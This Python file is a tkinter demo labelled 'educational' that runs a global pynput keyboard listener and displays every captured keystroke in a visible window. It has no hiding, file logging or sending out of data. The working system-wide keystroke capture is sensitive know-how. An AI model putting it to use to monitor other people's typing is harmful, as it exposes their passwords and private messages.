import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
import threading
import datetime

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Educational Keylogger Demo")
        self.root.geometry("700x500")
        
        # Warning label
        warning_frame = tk.Frame(root, bg="#ff6b6b", pady=10)
        warning_frame.pack(fill=tk.X)
        
        warning_label = tk.Label(
            warning_frame,
            text="⚠️ EDUCATIONAL USE ONLY - Use only on your own system ⚠️",
            bg="#ff6b6b",
            fg="white",
            font=("Arial", 12, "bold")
        )
        warning_label.pack()
        
        # Control frame
        control_frame = tk.Frame(root, pady=10)
        control_frame.pack()
        
        self.start_btn = tk.Button(
            control_frame,
            text="Start Monitoring",
            command=self.start_logging,
            bg="#4CAF50",
            fg="white",
            font=("Arial", 12),
            padx=20,
            pady=5
        )
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(
            control_frame,
            text="Stop Monitoring",
            command=self.stop_logging,
            bg="#f44336",
            fg="white",
            font=("Arial", 12),
            padx=20,
            pady=5,
            state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(
            control_frame,
            text="Clear Log",
            command=self.clear_log,
            bg="#2196F3",
            fg="white",
            font=("Arial", 12),
            padx=20,
            pady=5
        )
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Status label
        self.status_label = tk.Label(
            root,
            text="Status: Stopped",
            font=("Arial", 10),
            fg="red"
        )
        self.status_label.pack(pady=5)
        
        # Log display area
        log_frame = tk.Frame(root)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tk.Label(log_frame, text="Captured Keystrokes:", font=("Arial", 11, "bold")).pack(anchor=tk.W)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            wrap=tk.WORD,
            font=("Courier", 10),
            bg="#f5f5f5"
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Statistics
        stats_frame = tk.Frame(root)
        stats_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.stats_label = tk.Label(
            stats_frame,
            text="Total Keys Pressed: 0",
            font=("Arial", 9)
        )
        self.stats_label.pack(anchor=tk.W)
        
        # Variables
        self.is_logging = False
        self.listener = None
        self.key_count = 0
        
    def start_logging(self):
        """Start the keylogger"""
        self.is_logging = True
        self.key_count = 0
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_label.config(text="Status: Monitoring Active", fg="green")
        
        # Add timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_text.insert(tk.END, f"\n{'='*50}\n")
        self.log_text.insert(tk.END, f"Session Started: {timestamp}\n")
        self.log_text.insert(tk.END, f"{'='*50}\n")
        
        # Start listener in a separate thread
        self.listener = keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        )
        self.listener.start()
        
    def stop_logging(self):
        """Stop the keylogger"""
        self.is_logging = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Status: Stopped", fg="red")
        
        if self.listener:
            self.listener.stop()
            
        # Add timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_text.insert(tk.END, f"\n{'='*50}\n")
        self.log_text.insert(tk.END, f"Session Ended: {timestamp}\n")
        self.log_text.insert(tk.END, f"{'='*50}\n")
        
    def on_key_press(self, key):
        """Handle key press events"""
        if not self.is_logging:
            return
            
        self.key_count += 1
        self.stats_label.config(text=f"Total Keys Pressed: {self.key_count}")
        
        try:
            # Regular character keys
            key_str = key.char
        except AttributeError:
            # Special keys
            key_str = f"[{key.name}]"
            
        # Update GUI in main thread
        self.root.after(0, self.update_log, key_str)
        
    def on_key_release(self, key):
        """Handle key release events"""
        pass
        
    def update_log(self, key_str):
        """Update the log text widget"""
        self.log_text.insert(tk.END, key_str)
        self.log_text.see(tk.END)  # Auto-scroll to bottom
        
    def clear_log(self):
        """Clear the log display"""
        if messagebox.askyesno("Clear Log", "Are you sure you want to clear the log?"):
            self.log_text.delete(1.0, tk.END)
            self.key_count = 0
            self.stats_label.config(text="Total Keys Pressed: 0")

def main():
    root = tk.Tk()
    app = KeyloggerGUI(root)
    
    # Show disclaimer on startup
    messagebox.showwarning(
        "Educational Purpose Only",
        "This tool is for EDUCATIONAL PURPOSES ONLY.\n\n"
        "• Use only on your own system\n"
        "• Never use on others' computers\n"
        "• Unauthorized use is illegal\n\n"
        "By clicking OK, you agree to use this responsibly."
    )
    
    root.mainloop()

if __name__ == "__main__":
    main()